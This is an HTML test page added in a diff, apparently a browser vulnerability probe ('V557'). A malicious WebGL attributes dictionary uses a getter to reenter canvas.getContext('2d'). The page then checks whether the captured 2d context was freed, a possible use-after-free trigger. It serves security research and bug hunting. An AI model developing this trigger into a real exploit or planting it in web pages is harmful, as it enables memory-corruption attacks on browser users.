@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head><title>V557 Cross-Type Context Reentrancy</title></head>
+<body>
+<pre id="log"></pre>
+<script>
+function log(msg) {
+  document.getElementById('log').textContent += msg + '\n';
+}
+
+// V557: Cross-type getContext reentrancy test
+// Tests whether getContext('webgl', dict) allows reentrant getContext('2d')
+// that creates a 2d context which then gets freed when WebGL path overwrites m_context
+
+log('V557: Cross-type getContext reentrancy');
+log('======================================');
+
+try {
+  var canvas = document.createElement('canvas');
+  canvas.width = 100;
+  canvas.height = 100;
+  document.body.appendChild(canvas);
+
+  var capturedCtx2d = null;
+  var phase = 'initial';
+
+  // Malicious WebGL attributes dictionary
+  var maliciousAttrs = {};
+  Object.defineProperty(maliciousAttrs, 'alpha', {
+    get: function() {
+      if (phase === 'trigger') {
+        log('[GETTER] alpha getter called during WebGL dict conversion');
+        log('[GETTER] Creating 2d context via reentrant getContext...');
+        capturedCtx2d = canvas.getContext('2d');
+        if (capturedCtx2d) {
+          log('[GETTER] Got 2d context: ' + capturedCtx2d);
+          log('[GETTER] typeof: ' + typeof capturedCtx2d);
+        } else {
+          log('[GETTER] getContext("2d") returned null');
+        }
+      }
+      return true; // default alpha value
+    }
+  });
+
+  phase = 'trigger';
+  log('[MAIN] Calling canvas.getContext("webgl", maliciousAttrs)...');
+  var webglCtx = canvas.getContext('webgl', maliciousAttrs);
+  log('[MAIN] WebGL context result: ' + webglCtx);
+
+  if (capturedCtx2d) {
+    log('');
+    log('[CHECK] capturedCtx2d still exists as JS object: ' + capturedCtx2d);
+    log('[CHECK] typeof capturedCtx2d: ' + typeof capturedCtx2d);
+
+    // Test if the 2d context was freed (its backing C++ object destroyed)
+    // If freed, these operations may crash or return corrupted data
+    try {
+      log('[CHECK] Attempting lineWidth read...');
+      var lw = capturedCtx2d.lineWidth;
+      log('[CHECK] lineWidth = ' + lw + ' (expected 1 if alive)');
+    } catch(e) {
+      log('[CHECK] lineWidth threw: ' + e);
+    }
+
+    try {
+      log('[CHECK] Attempting fillStyle read...');
+      var fs = capturedCtx2d.fillStyle;
+      log('[CHECK] fillStyle = ' + fs);
+    } catch(e) {
+      log('[CHECK] fillStyle threw: ' + e);
+    }
+
+    try {
+      log('[CHECK] Attempting save()...');
+      capturedCtx2d.save();
+      log('[CHECK] save() succeeded');
+    } catch(e) {
+      log('[CHECK] save() threw: ' + e);
+    }
+
+    try {
+      log('[CHECK] Attempting getContextAttributes()...');
+      var attrs = capturedCtx2d.getContextAttributes();
+      log('[CHECK] getContextAttributes() = ' + JSON.stringify(attrs));
+    } catch(e) {
+      log('[CHECK] getContextAttributes() threw: ' + e);
+    }
+  } else {
+    log('[CHECK] No 2d context was captured');
+    log('[CHECK] Reentrancy may have been blocked');
+  }
+
+  log('');
+  log('[RESULT] If we reach here without crash, context may still be alive');
+  log('[RESULT] Check if webglCtx and capturedCtx2d point to different objects');
+  log('[RESULT] webglCtx === capturedCtx2d: ' + (webglCtx === capturedCtx2d));
+
+} catch(e) {
+  log('[ERROR] ' + e.name + ': ' + e.message);
+  log('[STACK] ' + e.stack);
+}
+</script>
+</body>
+</html>
